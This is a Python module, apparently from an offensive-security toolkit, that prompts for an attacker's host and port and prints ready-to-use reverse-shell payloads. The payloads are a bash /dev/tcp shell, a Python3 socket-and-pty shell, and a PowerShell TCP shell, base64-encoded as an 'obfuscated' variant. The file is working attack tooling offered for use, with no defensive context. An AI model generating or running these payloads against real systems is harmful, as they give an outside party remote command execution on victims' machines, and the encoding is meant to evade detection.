import base64
from rich.console import Console
from rich.syntax import Syntax
from core.ui import draw_header

console = Console()

def generate_shell():
    draw_header("Shell Forge")
    lhost = console.input("[bold yellow]LHOST: [/bold yellow]")
    lport = console.input("[bold yellow]LPORT: [/bold yellow]")

    if not lhost or not lport: return

    # PowerShell Logic
    ps_raw = f'$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sy=([text.encoding]::ASCII).GetBytes($sb+"PS "+(pwd).Path+"> ");$s.Write($sy,0,$sy.Length);$s.Flush()}};$c.Close()'
    ps_b64 = base64.b64encode(ps_raw.encode('utf-16le')).decode()

    shells = {
        "Bash Reverse": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Python3": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "PS Obfuscated": f"powershell -e {ps_b64}"
    }

    for name, code in shells.items():
        console.print(f"\n[bold cyan]--- {name} ---[/bold cyan]")
        console.print(Syntax(code, "bash" if "Bash" in name else "powershell", theme="monokai", word_wrap=True))

    input("\nPress Enter to return...")